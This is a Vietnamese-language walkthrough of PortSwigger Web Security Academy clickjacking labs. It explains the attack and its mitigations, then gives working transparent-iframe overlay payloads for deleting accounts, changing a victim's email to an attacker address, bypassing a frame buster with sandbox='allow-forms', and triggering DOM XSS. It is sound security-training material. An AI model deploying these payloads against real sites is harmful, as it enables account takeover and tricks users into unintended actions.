# Clickjacking

Nhân dịp trên mạng đang nổi trội những người thân bạn bè pay acc fb ngay trong 1 đêm thì mình có cảm hứng để làm về lổ hỗng [Clickjacking](https://portswigger.net/web-security/clickjacking)

## Clickjacking là gì ?
Nói ngắn gọn dễ hiểu nhất là một hình thức tấn công đánh lừa người dùng nhấp chuột vô ý vào một đối tượng trên website(ví dụ cụ thể ở đây là fb). Khi nhấp chuột vào một đối tượng trên màn hình, người dùng nghĩ là mình đang click vào đối tượng đó nhưng thực chất họ đang bị lừa click vào một đối tượng khác > đã bị làm mờ hay ẩn đi. Kẻ tấn công có thể sử dụng kỹ thuật tấn công này cho nhiều mục đích. Đánh cắp tài khoản người dùng, lừa click vào quảng cáo để kiếm tiền, lừa like page hoặc nguy hiểm hơn là cài một webshell lên máy chủ web.
## Có thể khai thác lỗ hổng này như thế nào ??
```
  + Hacker có thể lấy cắp thông tin đăng nhập của bạn thông qua 1 cái form fake trông có vẻ giống giống trang thật.
  + Lừa người dùng mở web-cam hoặc microphone bằng cách hiển thị các yếu tố vô hình trên trang cài đặt Adobe Flash.
  + Phát tán worms trên các trang mạng xã hội.
  + Phát tán malware bằng cách chuyển hướng người dùng tới link download chương trình độc hại.
  + Quảng cáo lừa đảo.
```
## Cách ngăn chặn Clickjacking

Clickjacking tấn công bằng cách bao bọc trang web mà người dùng tin tưởng bởi *iframe* sau đó render ẩn phần tử này lên trên cùng. Để ngăn chặn lỗ hổng này các bạn có thể sử dụng các cách sau :
```
  + X-Frame-Options
  + Content Security Policy
  + Frame-Killing

``` 
## Clickjacking Lab
  
### Lab: Basic clickjacking with CSRF token protection
Bài lab đã mô tả rõ ràng cho chúng ta cách thức để exploit lỗ hổng này chính là khai thác nút Delete Account bằng cách tạo ra 1 nút ảo đè lên và đánh lừa người dùng. 
Account : wiener:peter

Nhắc lại sơ về Clickjacking đó chính là sẽ tạo 1 btn ảo đè lên btn mà mình muốn nhằm đánh lừa người dùng, điều đó có nghĩa chúng ta phải dùng HTML để tạo khung sao cho btn ảo đè đúng lên ngay btn thật.
Truy cập bài lab thì chúng ta có thể thấy 1 blog như sau, và có chức năng My account như sau: 

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_protection.jpg?raw=true)

Có 1 vài chỉ dẫn về struct của html mà chúng ta sẽ exploit như sau : 
```
<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_protection_deleteacc.jpg?raw=true)

Tuy nhiên để phù hợp với HTML của trang web mà chúng ta đã đăng nhập vào và tương ứng với nút DeleteAccount thì chúng ta sẽ thay đổi như sau :
```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:510px;
       left:80px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ac061f661e51bedf80356b5100af000a.web-security-academy.net/my-account"></iframe>

```
Để đè được lên btn có sẳn trên trang web thì chúng ta phải có sự hỗ trợ của 1 exxploit server. Về tác dụng của exploit server cơ bản sẽ là giúp chúng ta đè khung HTML của chúng ta lên web site đích.
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_protection_exploitserve.jpg?raw=true)


Sau khi store cho payload lên web site mà chúng ta muốn, chúng ta có thể view exploit để check xem btn của mình đã đè lên real btn chưa.
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_protection_checkbtn.jpg?raw=true)

### Lab: Clickjacking with form input data prefilled from a URL parameter
Như mô tả thì đây là bài mở rộng của lab trên nên về cơ bản các bước chúng ta cũng làm tương tự như trên.

Tuy nhiên vì đây là chức năng update email. chúng ta có thể dùng nó để update email của chúng ta và leak thông tin.
Dùng burpSuite để bắt lại request khi update email.

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_param_request.jpg?raw=true)

Điều đó làm thay đổi cấu trúc của link mà chúng ta chèn vào trong khung HTML được dựng: 
```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:440px;
       left:50px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acfc1f101e46e458806d5c3d00b0004c.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Phần *email=hacker@attacker-website.com* chính là phần chúng ta thêm email của hacker để leak thông tin.



### Lab: Clickjacking with a frame buster script
Bài lab này đã cho chúng ta biết dùng lại kỹ thuật của 2 bài lab trên là vô dụng, và đưa ra 1 hướng mới cho chúng ta khai thác.
```
Frame busting techniques are often browser and platform specific and because of the flexibility of HTML 
they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security 
settings may prevent their operation or indeed the browser might not even support JavaScript. An effective
attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with 
the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster 
script can be neutralized as the iframe cannot check whether or not it is the top window:

<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
Như vậy là chúng ta đã có hướng giải quyết cho vấn đề, chúng ta dùng sandbox = allow-forms để vô hiệu hóa, vậy chúng ta truy cập exploit server để bắt đầu thực hiện xây dựng khung HTML 
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_script.jpg?raw=true)
```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:440px;
       left:50px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://ac6f1fa31ecac23380c4079b000d00fe.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_script_checkbtn.jpg?raw=true)

Để có được payload như trên phải căn chỉnh nhiều lần để rút ra được những thông số như thế.


### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

Bài lab mô tả về lỗ hổng để chúng ta khai thác là lỗ hổng XSS để gọi hàm print thì sẽ thành công qua bài lab.
Đầu tiên chúng ta có payload để exploit lỗi XSS và gọi hàm print() :
```
<img src=1 onerror=print()>
```
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_xss_check.jpg?raw=true)

Sau đó chúng ta test thử xem các ô có ô nào bị lỗi XSS thì thấy là biến name không hề validate input đầu vào => exploit name + HTML struct 

Chúng ta có payload sau để exploit web site:

```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:630px;
       left:60px;
       z-index: 1;
   }
</style>
<div>click me</div>
<iframe
src="https://acb41f951f633851803d2471000c00bf.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
Truy cập exploit server để store lên web site mà chúng ta cần exploit : 
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_xss_exploitserver.jpg?raw=true)

Trong quá trình xây dựng khung HTML cho chính xác chúng ta có thể dùng View Exploit để kiểm tra xem đã đúng vị trí hay chưa.
![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_xss_checkbtn.jpg?raw=true)

Sau khi khung HTML đã vào đúng vị trí và có thể exploit thì chúng ta Deliver to vivtim để solve bài lab.

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_xss_solve.jpg?raw=true)


### Lab: Multistep clickjacking

Bài lab mô tả rằng để chống lại Clickjacking web site đã thêm 1 xác nhận thứ 2. Vì vậy để có thể khai thác được chúng ta phải tạo ra 2 btn để đè lên 2 nút mới được tạo ra. Dựa vào lý thuyết đó

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_multi.jpg?raw=true)

Sau đây là cách thêm btn check để ngăn chặn Clickjacking :D 

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_multi_checkdell.jpg?raw=true)

Tương tự như những bài trên, nhưng lần này chúng ta phải xây dựng 2 btn và check 2 btn sao cho giống với web site gốc :D

```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:480px;
       left:50px;
       z-index: 1;
   }
   .secondClick {
       top:285px;
       left:220px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://accc1f5d1e509cb48060b032006d00e5.web-security-academy.net/my-account"></iframe>
```

Sau khi check thành công thì Delever để solve bài lab

![img](https://github.com/datnlq/Source/blob/main/Clickjacking/image/clickjacking_multi_exploitserver.jpg?raw=true)
